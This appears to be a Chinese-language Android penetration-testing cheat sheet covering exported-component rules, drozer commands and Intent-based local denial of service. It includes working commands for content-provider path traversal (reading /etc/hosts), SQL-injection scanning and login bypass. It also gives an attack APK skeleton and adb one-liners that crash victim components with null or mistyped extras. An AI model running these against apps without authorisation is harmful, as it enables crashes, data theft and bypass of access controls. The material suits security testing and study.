# 02 组件安全 · drozer 命令图谱 · Intent 本地 DoS

源：Android APP渗透测试方法大全 §3.1-3.7 / 附录 1.17 / 附录 2.1.1

---

## 2.1 导出（exported）判定矩阵

| 组件类型 | 显式 `android:exported` | 未声明时的默认 |
|---|---|---|
| Activity | true→可导出 / false→不可 | 有 `<intent-filter>` → **true**；无 → false |
| Service | 同上 | 有 `<intent-filter>` → **true**；无 → false |
| Receiver | 同上 | 有 `<intent-filter>` → **true**；无 → false |
| **Provider** | 同上 | **`minSdkVersion`/`targetSdkVersion` ≤ 16 → true；> 16 → false** |

Provider 这条不对称默认值是唯一会「同一 APK 在老机新机上结论相反」的点，写报告必须标注 SDK 版本。

**额外闸门**：
- `<permission android:protectionLevel="signature">` / `signatureOrSystem` → 只有同签名（或系统）应用能访问，外部 App 拿不到 → 降级
- 组件级 `android:permission` 与 Provider 的 `android:readPermission`/`writePermission` 分开看，常见只设了读没设写
- Provider 的 `grantUriPermissions`/`android:grantUriPermission` 可能被用来做临时授权绕过

---

## 2.2 drozer 命令图谱（一次装好，全流程复用）

```bash
# 客户端（PC）
drozer console connect                # 或 adb forward tcp:31415 tcp:31415 后 connect
# 设备端：安装 drozer agent apk → 打开 → 启用 Embedded Server
```

### A. 总入口
```
run app.package.attacksurface <pkg>
# 输出 exported activities / services / broadcast receivers / content providers
# + Debuggable / Backup 开关 —— 本清单 1~3 类的总入口
run app.package.info -a <pkg>              # 版本/权限/数据目录
run app.package.manifest <pkg>             # 导出 AndroidManifest.xml
run app.package.list -f <关键词>            # 按名字找包
run information.deviceinfo                 # 设备信息（核对 SDK 版本）
```

### B. Activity
```
run app.activity.info -a <pkg>                        # 导出的 activity
run app.activity.start --component <pkg> <activity>   # 免登录直达内页
# 带 extra 复现业务参数
run app.activity.start --component <pkg> .X --extra string key value
```

### C. Service
```
run app.service.info -a <pkg>
run app.service.start --component <pkg> <service> --extra string key value
run app.service.send <pkg> <service> --msg <what> <arg1> <arg2> --bundle-as-obj
```

### D. Broadcast Receiver
```
run app.broadcast.info -a <pkg>
run app.broadcast.info -a <pkg> -i              # 含 intent-filter
run app.broadcast.send --action <ACT> --component <pkg> <receiver> --extra string k v
run app.broadcast.sniff --action <ACT>          # 监听动态广播
```

### E. Content Provider
```
run app.provider.info -a <pkg>                  # 导出信息（含读写权限）
run scanner.provider.finduris -a <pkg>          # 枚举可达 URI
run app.provider.query content://<auth>/<path>  # 请求数据
run app.provider.query content://<auth>/<path> --selection-args <n> --projection <col>
run app.provider.read  content://<auth>/../../../../etc/hosts   # 目录遍历直接读
run app.provider.download content://<auth>/<path> /tmp/out      # 落盘
run scanner.provider.injection -a <pkg>         # 投影/选择参数 SQL 注入
run scanner.provider.traversal -a <pkg>         # 目录遍历
run scanner.provider.sqltables -a <pkg>         # 列 SQLite 表
```

### F. WebView
```
run scanner.misc.checkjavascriptbridge -a <pkg>
```

**代码侧交叉验证**（drozer 只报导出，看不到动态注册）：
```bash
grep -rn "addURI\|content://" src/            # 反推真实 URI
grep -rn "registerReceiver\|LocalBroadcastManager" src/   # 动态注册的 receiver
grep -rn "setDataSource\|openFile\|openFileOutput" src/   # Provider 内部真实文件路径
grep -rn "startService\|bindService\|sendBroadcast" src/  # 组件被谁调用、传什么
```

---

## 2.3 Intent 本地拒绝服务（四族，附攻击 APK 源码）

原理：被攻击组件 `getStringExtra/getIntExtra/getSerializableExtra` 等**未捕获异常**，任何 App 都能构造 Intent 打崩它。

| 族 | 触发点 | 判据 |
|---|---|---|
| 空值/NPE | `getAction().equals(...)`、`getExtras().getString()` 无 null 判断 | 直接崩 |
| 类转换异常 | 传自定义 `Serializable`，对方 `getSerializableExtra` 强转 | `ClassNotFoundException` / `ClassCastException` |
| 下标越界 | 空 `IntegerArrayList` 配 `USER_NUM` 循环取索引 | `IndexOutOfBoundsException` |
| 类型错配 | 该给 int 给 string（`getIntExtra` 拿到默认值走另一分支） | 逻辑篡改/崩溃 |

### 攻击 APK 骨架（Android 工程，三处改掉即可复现）

`AndroidManifest.xml`：
```xml
<manifest package="com.test.dos" ...>
  <uses-sdk android:minSdkVersion="8" />
  <application android:label="dos">
    <activity android:name=".MainActivity">
      <intent-filter>
        <action android:name="android.intent.action.MAIN" />
        <category android:name="android.intent.category.LAUNCHER" />
      </intent-filter>
    </activity>
    <receiver android:name=".DosReceiver" android:exported="true">
      <intent-filter><action android:name="com.test.dos.BOOM"/></intent-filter>
    </receiver>
    <service android:name=".DosService" android:exported="true"/>
  </application>
  <uses-permission android:name="android.permission.INTERNET" />
</manifest>
```

`MainActivity.java`（三选一，按目标组件的入口类型改）：
```java
public class MainActivity extends Activity {
  public void onCreate(Bundle b) {
    super.onCreate(b);
    // ① 打 Activity：直接构造 Intent
    Intent i = new Intent(Intent.ACTION_MAIN);
    i.setClassName("<victim.pkg>", "<victim.pkg>.<VictimActivity>");
    i.putExtras(null);              // 或 putExtra("id", (String) null)
    startActivity(i);

    // ② 打 Service
    Intent s = new Intent();
    s.setClassName("<victim.pkg>", "<victim.pkg>.<VictimService>");
    s.putStringArrayListExtra("USER_NUM", new ArrayList<String>());  // 空表 → 下标越界
    startService(s);

    // ③ 打 Receiver（也可直接 am broadcast，不需要本 APK）
    Intent r = new Intent("com.victim.ACTION");
    r.setClassName("<victim.pkg>", "<victim.pkg>.<VictimReceiver>");
    r.putExtra("token", (String) null);
    sendBroadcast(r);
  }
}
```

### 纯 adb 版（不用写 APK，最快）
```bash
adb shell am start   -n <pkg>/<VictimActivity> -e key ''        # 空 extra
adb shell am start   -n <pkg>/<VictimActivity> --ez flag        # 类型错配
adb shell am startservice -n <pkg>/<VictimService> --esa USER_NUM ''
adb shell am broadcast -a <ACT> -n <pkg>/<VictimReceiver>
adb shell am broadcast -a <ACT> -n <pkg>/<VictimReceiver> -e token nul
```
验证：`adb logcat | grep -i "AndroidRuntime\|FATAL"` 出现崩溃栈即成立。

---

## 2.4 Content Provider 代码推导（附录 2.1.1）

manifest：
```xml
<provider android:name="com.test.MyProvider"
          android:authorities="com.test.provider" />
```
代码里 `UriMatcher.addURI("com.test.provider", "table1", 1)` ⇒ 真实访问 URI：
```
content://com.test.provider/table1/
```
grep `addURI` 是**从声明反推真实 URI 的唯一可靠方法**（authorities 只是前缀，路径由 addURI 决定）。
